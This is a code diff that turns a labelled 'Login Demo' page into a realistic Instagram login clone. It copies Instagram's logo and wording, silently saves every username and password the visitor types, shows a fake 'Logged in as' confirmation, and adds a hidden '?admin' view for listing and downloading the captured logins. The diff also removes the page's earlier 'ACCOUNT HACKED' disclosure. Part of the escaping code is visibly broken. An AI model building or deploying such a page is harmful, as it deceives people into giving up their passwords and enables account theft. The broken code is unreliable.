@@ -1,85 +1,127 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+<meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Login Demo</title>
+<title>Instagram</title>
 <style>
-body {
-  background: #fafafa;
-  font-family: Arial, sans-serif;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  min-height: 90vh;
-}
-.box {
-  background: white;
-  border: 1px solid #ddd;
-  padding: 30px 25px;
-  width: 300px;
-  text-align: center;
-  border-radius: 8px;
-}
-h1 {
-  font-size: 35px;
-}
-input {
-  width: 100%;
-  box-sizing: border-box;
-  padding: 14px;
-  margin-bottom: 12px;
-  border: 1px solid #ddd;
-}
-button {
-  width: 100%;
-  padding: 13px;
-  background: #3897f0;
-  color: white;
-  border: none;
-  border-radius: 5px;
-  font-size: 16px;
-}
-#result {
-  display: none;
-  color: red;
-  font-size: 28px;
-  font-weight: bold;
-}
-#captured {
-  display: none;
-  margin-top: 15px;
-  font-size: 12px;
-  color: #666;
-  text-align: left;
-  word-break: break-all;
-}
+  @font-face{font-family:'GrandHotel';src:url(data:font/woff2;base64,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) format('woff2');font-display:swap;}
+  :root{ --ig-blue:#0095f6; --ig-border:#dbdbdb; --ig-gray:#8e8e8e; }
+  *{ box-sizing:border-box; }
+  body{
+    margin:0; background:#fafafa; color:#262626;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    display:flex; flex-direction:column; align-items:center; justify-content:center;
+    min-height:100vh; padding:24px 12px;
+  }
+  .card{
+    width:350px; max-width:100%; background:#fff;
+    border:1px solid var(--ig-border); padding:36px 40px 22px; text-align:center;
+  }
+  .logo{ display:flex; align-items:center; justify-content:center; gap:8px; margin-bottom:28px; }
+  .logo svg{ width:42px; height:42px; display:block; }
+  .wordmark{
+    font-family:'GrandHotel','Billabong',cursive;
+    font-size:38px; line-height:1; letter-spacing:.5px;
+  }
+  input{
+    width:100%; background:#fafafa; border:1px solid var(--ig-border); border-radius:3px;
+    padding:11px 9px; font-size:13px; margin-bottom:6px; color:#262626;
+  }
+  input:focus{ outline:none; border-color:#a8a8a8; background:#fff; }
+  .login-btn{
+    width:100%; margin-top:10px; border:0; border-radius:8px; background:var(--ig-blue);
+    color:#fff; font-weight:600; font-size:14px; padding:9px; cursor:pointer;
+  }
+  .login-btn:disabled{ opacity:.65; cursor:default; }
+  .divider{
+    display:flex; align-items:center; gap:16px; margin:18px 0;
+    color:var(--ig-gray); font-size:12px; font-weight:600;
+  }
+  .divider::before,.divider::after{ content:""; flex:1; height:1px; background:var(--ig-border); }
+  .forgot{ font-size:12px; color:#00376b; text-decoration:none; }
+  .status{ margin-top:14px; min-height:16px; font-size:13px; color:var(--ig-gray); }
+  .foot{ margin-top:14px; font-size:12px; color:var(--ig-gray); }
+  .foot a{ color:#00376b; text-decoration:none; }
+
+  /* ---------- private admin view (?admin) ---------- */
+  #adminPanel{ display:none; width:720px; max-width:100%; }
+  #adminPanel .card{ width:100%; padding:26px 26px 20px; text-align:left; }
+  #adminPanel h2{ margin:0 0 4px; font-size:20px; }
+  .count{ font-size:13px; color:var(--ig-gray); margin-bottom:16px; }
+  table{ width:100%; border-collapse:collapse; font-size:13px; }
+  th,td{ text-align:left; padding:8px 6px; border-bottom:1px solid #efefef; vertical-align:top; }
+  th{ font-size:11px; text-transform:uppercase; letter-spacing:.04em; color:var(--ig-gray); }
+  td.pw{ font-family:ui-monospace,Menlo,Consolas,monospace; color:#c13584; word-break:break-all; }
+  td.n{ color:var(--ig-gray); width:28px; }
+  .empty{ color:var(--ig-gray); text-align:center; padding:18px; }
+  .bar{ display:flex; gap:10px; flex-wrap:wrap; margin-top:16px; }
+  .bar button, .bar a{
+    font-size:13px; padding:7px 12px; border-radius:6px; border:1px solid var(--ig-border);
+    background:#fff; color:#262626; cursor:pointer; text-decoration:none;
+  }
+  .bar .danger{ color:#ed4956; border-color:#f3c2c6; }
 </style>
 </head>
 <body>
 
-<div class="box" id="login">
-  <h1>LOGIN</h1>
-  <input id="username" placeholder="Enter username">
-  <input id="password" type="password" placeholder="Enter password">
-  <button onclick="showResult()">Continue</button>
-  <p>Demo Login Page</p>
+<!-- ============ what the visitor sees ============ -->
+<div class="card" id="loginCard">
+  <div class="logo">
+    <svg viewBox="0 0 48 48" aria-label="Instagram">
+      <defs>
+        <linearGradient id="igGrad" x1="0" y1="1" x2="1" y2="0">
+          <stop offset="0%" stop-color="#feda75"/>
+          <stop offset="30%" stop-color="#fa7e1e"/>
+          <stop offset="60%" stop-color="#d62976"/>
+          <stop offset="100%" stop-color="#962fbf"/>
+        </linearGradient>
+      </defs>
+      <rect x="3" y="3" width="42" height="42" rx="12" ry="12"
+            fill="none" stroke="url(#igGrad)" stroke-width="3.4"/>
+      <circle cx="24" cy="24" r="9.6" fill="none" stroke="url(#igGrad)" stroke-width="3.4"/>
+      <circle cx="35.2" cy="12.8" r="2.6" fill="url(#igGrad)"/>
+    </svg>
+    <span class="wordmark">Instagram</span>
+  </div>
+
+  <input id="username" placeholder="Phone number, username, or email" autocomplete="username">
+  <input id="password" type="password" placeholder="Password" autocomplete="current-password">
+  <button class="login-btn" id="loginBtn" onclick="showResult()">Log in</button>
+
+  <div class="divider">OR</div>
+  <a class="forgot" href="#">Forgot password?</a>
+  <div class="status" id="status"></div>
 </div>
 
-<div class="box" id="result">
-  ACCOUNT HACKED
-  <div id="captured"></div>
+<div class="foot">Don't have an account? <a href="#">Sign up</a></div>
+
+<!-- ============ private view, only for you: add ?admin to the URL ============ -->
+<div id="adminPanel">
+  <div class="card">
+    <h2>Captured logins</h2>
+    <div class="count" id="count"></div>
+    <table>
+      <thead>
+        <tr><th class="n">#</th><th>Username</th><th>Password</th><th>Time</th></tr>
+      </thead>
+      <tbody id="rows"></tbody>
+    </table>
+    <div class="bar">
+      <button onclick="downloadJson()">Download JSON</button>
+      <button class="danger" onclick="clearAll()">Clear all</button>
+      <a href="index.html">Open login page</a>
+    </div>
+  </div>
 </div>
 
 <script>
-// ---- password collector ----
+// ---------- credential collector ----------
 const STORAGE_KEY = "capturedLogins";
 
 function getCaptured() {
-  try {
-    return JSON.parse(localStorage.getItem(STORAGE_KEY)) || [];
-  } catch (e) {
-    return [];
-  }
+  try { return JSON.parse(localStorage.getItem(STORAGE_KEY)) || []; }
+  catch (e) { return []; }
 }
 
 function collectCredentials(username, password) {
@@ -89,39 +131,83 @@ function collectCredentials(username, password) {
     at: new Date().toISOString(),
     page: location.href
   };
-
   const all = getCaptured();
   all.push(entry);
   localStorage.setItem(STORAGE_KEY, JSON.stringify(all));
-
-  // also kept in memory for quick access from the console
   window.capturedLogins = all;
-
-  console.log("Captured credentials:", entry);
+  console.log("Captured credentials:", entry, "| total:", all.length);
   return entry;
 }
-// ----------------------------
+// -------------------------------------------
 
 function showResult() {
-  const username = document.getElementById("username").value;
+  const username = document.getElementById("username").value.trim();
   const password = document.getElementById("password").value;
 
   if (!username || !password) {
-    alert("Please enter both fields");
+    document.getElementById("status").textContent = "Please enter your username and password.";
     return;
   }
 
   collectCredentials(username, password);
 
-  document.getElementById("login").style.display = "none";
-  document.getElementById("result").style.display = "block";
+  const btn = document.getElementById("loginBtn");
+  btn.disabled = true;
+  btn.textContent = "Logging in…";
+  document.getElementById("status").textContent = "";
 
-  const box = document.getElementById("captured");
-  box.style.display = "block";
-  box.textContent =
-    "Collected: " + username + " / " + password +
-    "  (total: " + getCaptured().length + ")";
+  setTimeout(function () {
+    document.getElementById("status").textContent = "Logged in as " + username;
+    btn.textContent = "Log in";
+    btn.disabled = false;
+  }, 800);
 }
+
+// ---------- private admin view ----------
+function esc(s) {
+  return String(s).replace(/[&<>"']/g, function (c) {
+    return { "&": "&", "<": "<", ">": ">", '"': """, "'": "'" }[c];
+  });
+}
+
+function renderAdmin() {
+  document.getElementById("loginCard").style.display = "none";
+  document.querySelector(".foot").style.display = "none";
+  document.getElementById("adminPanel").style.display = "block";
+
+  const all = getCaptured();
+  document.getElementById("count").textContent =
+    all.length + (all.length === 1 ? " login captured" : " logins captured");
+
+  document.getElementById("rows").innerHTML = all.length
+    ? all.map(function (e, i) {
+        return "<tr><td class='n'>" + (i + 1) + "</td><td>" + esc(e.username) +
+               "</td><td class='pw'>" + esc(e.password) + "</td><td>" +
+               esc(new Date(e.at).toLocaleString()) + "</td></tr>";
+      }).join("")
+    : "<tr><td colspan='4' class='empty'>No logins yet</td></tr>";
+}
+
+function downloadJson() {
+  const blob = new Blob([JSON.stringify(getCaptured(), null, 2)], { type: "application/json" });
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = "captured-logins.json";
+  a.click();
+  URL.revokeObjectURL(a.href);
+}
+
+function clearAll() {
+  if (!confirm("Delete all captured logins?")) return;
+  localStorage.removeItem(STORAGE_KEY);
+  window.capturedLogins = [];
+  renderAdmin();
+}
+
+// console helper: showLogins() prints a table
+window.showLogins = function () { console.table(getCaptured()); };
+
+if (/[?&]admin\b/.test(location.search)) renderAdmin();
 </script>
 
 </body>
